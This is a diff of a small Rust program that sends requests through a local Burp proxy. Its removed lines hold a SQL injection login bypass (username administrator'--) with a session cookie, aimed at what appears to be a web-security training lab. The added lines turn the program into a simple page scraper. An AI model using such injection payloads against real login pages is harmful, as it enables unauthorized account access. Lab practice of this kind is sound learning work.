@@ -1,39 +1,42 @@
+#![allow(unused)]
 use reqwest::{self};
-use reqwest::header::COOKIE;
+use scraper::{Html, Selector};
+use prettytable::{Cell, Row, Table};
 use std::fs::File;
 use std::io::Read;
+use std::io;
+//This version has the ability to take the url via command line argument 
 
-
-// tokio let's us use "async" on our main function
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    
+    println!("Please specify your url");
+    let mut url = String::new();
+    io::stdin().read_line(&mut url).expect("Failed to read line");
+    let url = url.trim();
+    
     // Create a reqwest Client
     let mut buf = Vec::new();
-    //this finds the burp cert and reads it 
-    let _file = File::open("/home/redbeard/Downloads/cacert.der")?
-                .read_to_end(&mut buf).unwrap();
 
+    let _file = File::open("/home/redbeard/Downloads/cacert.der")?
+        .read_to_end(&mut buf)
+        .unwrap();
 
     let cert = reqwest::Certificate::from_der(&buf).unwrap();
 
-    //This sends everything through burp 
     let client = reqwest::Client::builder()
         .proxy(reqwest::Proxy::all("http://127.0.0.1:8080").unwrap())
         .add_root_certificate(cert)
-        .build().unwrap();
+        .build()
+        .unwrap();
 
 
-    // URL of the endpoint for the sqli
-    let url = "https://0a6f00fd0361102580714474005e00eb.web-security-academy.net/login";
-
-    let body = "csrf=niQ9D7M6goiy9mpFNQN2wZGi7GaUiNRR&username=administrator'--&password=jim";
-    let cookie = "session=ONaz9hrysDv5TTrNgGrWzRBKcYhUvRWQ";
     
-
+    
+   
     // Send the HTTP request and handle the response
-    let response = client.post(url)
-    .header( "session=ONaz9hrysDv5TTrNgGrWzRBKcYhUvRWQ", COOKIE)
-    .body(body)
+    let response = client
+    .get(url)
     .send()
     .await?;
 
@@ -43,8 +46,25 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         return Err("Request failed".into());
     }
 
-     // Read the response body as text
-     let _html = response.text().await?;
+    // Read the response body as text
+    let _html = response.text().await?;
+    let document = Html::parse_document(&_html);
+    let payout = Selector::parse("div").unwrap();
+    
 
+    
+//let mut table = Table::new();
+//table.add_row(Row::new(vec![
+//    Cell::new("DIV")]));
+
+//let dapayout = document.select(&payout).collect::<Vec<_>>();
+//for pay in dapayout.iter() {
+//    let dapayout_text = pay.text().collect::<String>();
+
+//    table.add_row(Row::new(vec![
+//        Cell::new(&dapayout_text)]));
+//}
+
+//table.printstd();
     Ok(())
 }
